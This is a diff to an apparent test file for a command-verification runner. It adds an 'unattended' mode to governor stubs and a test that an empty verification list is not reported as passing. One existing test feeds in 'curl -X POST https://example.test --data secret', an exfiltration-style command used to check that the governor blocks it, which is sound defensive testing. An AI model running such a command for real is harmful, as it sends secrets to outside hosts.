@@ -26,6 +26,7 @@ test('verification fails closed and stops when the governor blocks a command', a
   const outcome = await runVerification(['echo safe', 'curl -X POST https://example.test --data secret'],     undefined,
     undefined,
     {
+      mode: 'unattended' as const,
       stats: () => ({ maxActions: 0, consumed: 0, exhausted: false, blockedByBudget: 0 }),
       async check(request) {
 
@@ -222,6 +223,7 @@ test('a real failing check still fails the gate when a server is present', async
 /** A governor that permits every command, so a test exercises the gate itself. */
 function allowAllGovernor() {
   return {
+    mode: 'unattended' as const,
     stats: () => ({ maxActions: 0, consumed: 0, exhausted: false, blockedByBudget: 0 }),
     async check() {
       return {
@@ -231,3 +233,13 @@ function allowAllGovernor() {
     },
   }
 }
+
+// A4-03: an empty verification command list used to "pass" with zero checks —
+// runVerification([]) returned { passed: true, results: [] }, so a run whose
+// plan declared nothing to verify went green without proving anything.
+test('an empty verification is unverified, not green', async () => {
+  const outcome = await runVerification([], undefined, undefined, allowAllGovernor())
+  expect(outcome.passed).toBe(false)
+  expect(outcome.results).toHaveLength(0)
+  expect(outcome.inconclusive).toContain('no verification commands')
+})
